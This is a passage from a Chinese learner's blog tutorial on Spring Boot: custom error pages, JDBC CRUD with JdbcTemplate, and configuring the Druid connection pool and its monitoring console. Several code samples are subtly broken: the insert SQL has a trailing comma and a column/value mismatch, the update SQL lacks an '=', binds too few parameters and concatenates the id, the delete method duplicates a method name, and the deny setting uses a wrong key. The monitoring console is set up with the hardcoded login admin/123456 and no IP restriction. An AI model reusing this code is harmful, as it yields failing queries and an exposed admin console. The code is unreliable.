#E5C07B">PathVariable</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;id&quot;</span><span style="color: #E06C75">)</span><span style="color: #C678DD">int</span><span style="color: #E06C75"> id){</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">employeeDao</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">delete</span><span style="color: #ABB2BF">(id);</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;redirect:/emps&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure></li></ul><h2 id="报错问题"><a href="#报错问题" class="headerlink" title="报错问题"></a>报错问题</h2><p>404  500…….</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251103202131239.png" alt="image-20251103202131205"></p><p>模板文件夹下，添加error文件夹，直接在里面搞一个404.html即可</p><p>报错会自动找到这里</p><h1 id="整合JDBC使用"><a href="#整合JDBC使用" class="headerlink" title="整合JDBC使用"></a>整合JDBC使用</h1><p>DBC（Java Database Connectivity）是 Java 语言中用于连接和操作数据库的标准 API（应用程序编程接口）。它提供了一套统一的规范，让 Java 程序能够通过标准的方法访问各种关系型数据库（如 MySQL、Oracle、SQL Server 等），而无需关注底层数据库的具体实现细节</p><ul><li><p>创建项目</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251104203324971.png" alt="image-20251104203317832"></p></li><li><p>配置yaml，使用代码输出查看默认</p><figure class="shiki yaml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">spring</span><span style="color: #ABB2BF">:</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #E06C75">datasource</span><span style="color: #ABB2BF">:</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">username</span><span style="color: #ABB2BF">:</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">password</span><span style="color: #ABB2BF">:</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">url</span><span style="color: #ABB2BF">: </span><span style="color: #98C379">jdbc:mysql://localhost:3306/mybatis?useUnicode=true&amp;characterEncoding=utf-8</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">driver-class-name</span><span style="color: #ABB2BF">: </span><span style="color: #98C379">com.mysql.cj.jdbc.Driver</span></span></code></pre></div></div></figure><p>输出默认数据源</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">SpringBootTest</span></span><span class="line"><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">JdbcApplicationTests</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Autowired</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">DataSource</span><span style="color: #E06C75"> dataSource</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Test</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> contextLoads</span><span style="color: #ABB2BF">()</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dataSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span></code></pre></div></div></figure><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251104224204424.png" alt="image-20251104224204290"></p><p>输出数据源为class com.zaxxer.hikari.HikariDataSource</p></li><li><p>连接之前，需要启动数据库服务</p><p>我用的是phpstudy，创建库，导入数据即可</p></li><li><p>数据库连接</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Test</span></span><span class="line"><span style="color: #C678DD">void</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">contextLoads</span><span style="color: #E06C75">() {</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dataSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//建立数据库连接</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Connection</span><span style="color: #E06C75"> connection </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">dataSource</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getConnection</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(connection);</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//关闭</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">connection</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">close</span><span style="color: #ABB2BF">();</span></span></code></pre></div></div></figure><p>发现没有配置时区</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251105164825642.png" alt="image-20251105164818539"></p><p>配置</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251105165013563.png" alt="image-20251105165013520"></p><p>跑一下即可</p></li><li><p>查询数据库中的所有信息(直接将方法分装到MAP里面，相当于bean)</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">//查询数据库中的所有信息</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//没有实体类，数据库中的东西，怎么获取？----MAP</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">GetMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/userList&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">List</span><span style="color: #56B6C2">&lt;</span><span style="color: #E5C07B">Map</span><span style="color: #56B6C2">&lt;</span><span style="color: #E06C75">String</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> Object</span><span style="color: #56B6C2">&gt;&gt;</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">userList</span><span style="color: #E06C75">() {</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> sql </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;select * from user&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">List</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Map</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt;&gt;</span><span style="color: #E06C75"> list_maps </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">jdbcTemplate</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">queryForList</span><span style="color: #ABB2BF">(sql);</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> list_maps</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251105222203736.png" alt="image-20251105222203629"></p><p>和数据库匹配</p></li><li><p>写增删改查</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251105223846685.png" alt="image-20251105223846633"></p><p>增加成功</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">//增加</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">GetMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/addUser&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">addUser</span><span style="color: #E06C75">() {</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> sql </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;insert into localhost.user (id,username,password,email,) values(4,&#39;huazi&#39;,&#39;1346&#39;)&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">jdbcTemplate</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">update</span><span style="color: #ABB2BF">(sql);</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;success&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">}</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//更新</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">GetMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/updateUser/{id}&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">updateUser</span><span style="color: #E06C75">(</span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">PathVariable</span><span style="color: #E06C75"> (</span><span style="color: #98C379">&quot;id&quot;</span><span style="color: #E06C75">)</span><span style="color: #C678DD">int</span><span style="color: #E06C75"> id) {</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> sql </span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;update localhost.user set username=?,password? where id=?&quot;</span><span style="color: #56B6C2">+</span><span style="color: #E06C75">id</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//封装</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75">[] objects </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75">[</span><span style="color: #D19A66">2</span><span style="color: #E06C75">]</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    objects[</span><span style="color: #D19A66">0</span><span style="color: #E06C75">] </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;huazi&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    objects[</span><span style="color: #D19A66">1</span><span style="color: #E06C75">] </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;sdf&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">jdbcTemplate</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">update</span><span style="color: #ABB2BF">(sql, objects);</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;ok&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">}</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//删除</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">GetMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/deleteUser/{id}&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">updateUser</span><span style="color: #E06C75">(</span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">PathVariable</span><span style="color: #E06C75"> (</span><span style="color: #98C379">&quot;id&quot;</span><span style="color: #E06C75">)</span><span style="color: #C678DD">int</span><span style="color: #E06C75"> id) {</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> sql </span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;delete from localhost.user where id=?&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">jdbcTemplate</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">update</span><span style="color: #ABB2BF">(sql, id);</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;ok!!!&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure></li></ul><h1 id="整合Druid数据源"><a href="#整合Druid数据源" class="headerlink" title="整合Druid数据源"></a>整合Druid数据源</h1><p>Java程序很大一部分要操作数据库，为了提高性能操作数据库的时候，又不得不使用数据库连接池。</p><p>Druid 是阿里巴巴开源平台上一个数据库连接池实现，结合了 C3P0、DBCP 等 DB 池的优点，同时加入了日志监控。</p><p>Druid 可以很好的监控 DB 池连接和 SQL 的执行情况，天生就是针对监控而生的 DB 连接池</p><h2 id="配置数据源"><a href="#配置数据源" class="headerlink" title="配置数据源"></a>配置数据源</h2><ul><li><p>添加上 Druid 数据源依赖</p><figure class="shiki xml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">&lt;!-- https://mvnrepository.com/artifact/com.alibaba/druid --&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">dependency</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">    &lt;</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;com.alibaba&lt;/</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">    &lt;</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;druid&lt;/</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">    &lt;</span><span style="color: #E06C75">version</span><span style="color: #ABB2BF">&gt;1.2.27&lt;/</span><span style="color: #E06C75">version</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">dependency</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251106110200084.png" alt="image-20251106110152978"></p><p>成功导入</p></li><li><p>配置数据源</p><p>在yaml文件配置</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251106110500904.png" alt="image-20251106110500857"></p></li><li><p>配其他东西</p><figure class="shiki yaml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">#Spring Boot 默认是不注入这些属性值的，需要自己绑定</span></span><span class="line"><span style="color: #7F848E; font-style: italic">#druid 数据源专有配置</span></span><span class="line"><span style="color: #E06C75">initialSize</span><span style="color: #ABB2BF">: </span><span style="color: #D19A66">5</span></span><span class="line"><span style="color: #E06C75">minIdle</span><span style="color: #ABB2BF">: </span><span style="color: #D19A66">5</span></span><span class="line"><span style="color: #E06C75">maxActive</span><span style="color: #ABB2BF">: </span><span style="color: #D19A66">20</span></span><span class="line"><span style="color: #E06C75">maxWait</span><span style="color: #ABB2BF">: </span><span style="color: #D19A66">60000</span></span><span class="line"><span style="color: #E06C75">timeBetweenEvictionRunsMillis</span><span style="color: #ABB2BF">: </span><span style="color: #D19A66">60000</span></span><span class="line"><span style="color: #E06C75">minEvictableIdleTimeMillis</span><span style="color: #ABB2BF">: </span><span style="color: #D19A66">300000</span></span><span class="line"><span style="color: #E06C75">validationQuery</span><span style="color: #ABB2BF">: </span><span style="color: #98C379">SELECT 1 FROM DUAL</span></span><span class="line"><span style="color: #E06C75">testWhileIdle</span><span style="color: #ABB2BF">: </span><span style="color: #D19A66">true</span></span><span class="line"><span style="color: #E06C75">testOnBorrow</span><span style="color: #ABB2BF">: </span><span style="color: #D19A66">false</span></span><span class="line"><span style="color: #E06C75">testOnReturn</span><span style="color: #ABB2BF">: </span><span style="color: #D19A66">false</span></span><span class="line"><span style="color: #E06C75">poolPreparedStatements</span><span style="color: #ABB2BF">: </span><span style="color: #D19A66">true</span></span><span class="line"><span style="color: #ABB2BF">  </span></span><span class="line"><span style="color: #7F848E; font-style: italic">#配置监控统计拦截的filters，stat:监控统计、log4j：日志记录、wall：防御sql注入</span></span><span class="line"><span style="color: #7F848E; font-style: italic">#如果允许时报错 java.lang.ClassNotFoundException: org.apache.log4j.Priority</span></span><span class="line"><span style="color: #7F848E; font-style: italic">#则导入 log4j 依赖即可, Maven 地址： https://mvnrepository.com/artifact/log4j/log4j</span></span><span class="line"><span style="color: #E06C75">filters</span><span style="color: #ABB2BF">: </span><span style="color: #98C379">stat,wall,log4j</span></span><span class="line"><span style="color: #E06C75">maxPoolPreparedStatementPerConnectionSize</span><span style="color: #ABB2BF">: </span><span style="color: #D19A66">20</span></span><span class="line"><span style="color: #E06C75">useGlobalDataSourceStat</span><span style="color: #ABB2BF">: </span><span style="color: #D19A66">true</span></span><span class="line"><span style="color: #E06C75">connectionProperties</span><span style="color: #ABB2BF">: </span><span style="color: #98C379">druid.stat.mergeSql=true;druid.stat.slowSqlMillis=500</span></span></code></pre></div></div></figure><p>log4j记得导入maven</p></li></ul><h2 id="将数据库文件和配置文件绑定"><a href="#将数据库文件和配置文件绑定" class="headerlink" title="将数据库文件和配置文件绑定"></a>将数据库文件和配置文件绑定</h2><p>写一个DruidConfig文件</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251106122435831.png" alt="image-20251106122435723"></p><p>将自定义的容器<code>datasources</code>   bean到容器中，不需要springboot创建</p><h2 id="配置DruidConfig"><a href="#配置DruidConfig" class="headerlink" title="配置DruidConfig"></a>配置DruidConfig</h2><p>Druid 是阿里巴巴开源的一个数据库连接池（DataSource），<br> 它自带一个 <strong>web 监控界面</strong>，可以查看：</p><ul><li>当前数据库连接池的运行状态（活跃连接数、SQL 执行慢查询等）</li><li>SQL 执行统计</li><li>Web 应用性能监控等。</li></ul><p>这个后台监控页面的访问路径通常是：</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">http://localhost:8080/druid</span></span></code></pre></div></div></figure><p>但要让这个后台界面能访问，你得先在配置里注册一个 Servlet（负责处理 <code>/druid/*</code> 的请求）。</p><ul><li><p>后台监控</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">//后台检测</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Bean</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//不写注解，进不到ServletRegistrationBean</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ServletRegistrationBean</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">servletRegistrationBean</span><span style="color: #E06C75">() {</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">ServletRegistrationBean</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">StatViewServlet</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> bean </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ServletRegistrationBean</span><span style="color: #ABB2BF">&lt;&gt;</span><span style="color: #E06C75">(</span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">StatViewServlet</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;/druid/*&quot;</span><span style="color: #E06C75">)</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #7F848E; font-style: italic">//后台需要有人登录，账号密码配置</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> initParams </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;&gt;</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #7F848E; font-style: italic">//添加配置</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">initParams</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;loginUsername&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;admin&quot;</span><span style="color: #ABB2BF">);</span><span style="color: #7F848E; font-style: italic">//登录的key是固定的</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">initParams</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;loginPassword&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;123456&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #7F848E; font-style: italic">//允许谁可以访问</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">initParams</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;allow&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;&quot;</span><span style="color: #ABB2BF">);</span><span style="color: #7F848E; font-style: italic">//写谁就是谁可以访问</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #7F848E; font-style: italic">//禁止谁可以访问</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">initParams</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;running&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;192.168.11.123&quot;</span><span style="color: #ABB2BF">);</span><span style="color: #7F848E; font-style: italic">//设置谁（前面的引号），设置他的ip（后面的引号）</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">bean</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setInitParameters</span><span style="color: #ABB2BF">(initParams);</span><span style="color: #7F848E; font-style: italic">//设置初始化参数</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> bean</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    }</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251106172306222.png" alt="image-20251106172306093"></p><p>跑一下，发现成功</p></li><li><p>重申：</p><p>后台监控应该是web.xml用的事情</p><p>但是由于springboot内置了 servlet容器，所以没有web,xml，代替方法就是ServletRegistrationBean</p><table><thead><tr><th>部分</th><th>作用</th></tr></thead><tbody><tr><td><code>@Bean</code></td><td>注册这个配置到 Spring 容器</td></tr><tr><td><code>ServletRegistrationBean</code></td><td>注册 Druid 的后台监控 Servlet</td></tr><tr><td><code>new StatViewServlet()</code></td><td>Druid 内置的统计与监控 Servlet</td></tr><tr><td><code>&quot;/druid/*&quot;</code></td><td>访问路径映射</td></tr><tr><td><code>loginUsername</code> &#x2F; <code>loginPassword</code></td><td>登录后台的账号密码</td></tr><tr><td><code>allow</code></td><td>IP 白名单（为空表示不限制）</td></tr></tbody></table></li><li><p>设置过滤器</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">//设置filter</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Bean</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">FilterRegistrationBean</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">WebStartFilter</span><span style="color: #E06C75">() {</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">FilterRegistrationBean</span><span style="color: #E06C75"> bean </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">FilterRegistrationBean</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">bean</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setFilter</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">WebStatFilter</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//可以过滤的请求</span></span><span class="line"><span style="color: #E06C75">    